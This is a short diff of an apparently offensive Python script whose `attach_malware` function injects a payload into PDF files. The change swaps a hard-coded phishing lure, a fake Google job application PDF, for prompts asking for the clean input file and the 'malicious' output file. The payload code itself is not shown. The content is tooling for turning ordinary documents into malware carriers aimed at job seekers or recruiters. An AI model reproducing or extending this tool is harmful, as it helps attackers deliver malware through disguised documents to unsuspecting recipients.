@@ -17,4 +17,6 @@ def attach_malware(input_file, output_file, payload='payload3'):
 	out.write(outstream)
 
 if __name__ == '__main__':
-	attach_malware('Clean-Google-Employment-Application.pdf', 'google-job-application.pdf')
+	in_file = str(input("Please enter the name of the input PDF file (e.g. clean.pdf): "))
+	out_file = str(input("Please enter the name of the output PDF file (e.g. malicious.pdf): "))
+	attach_malware(in_file, out_file)
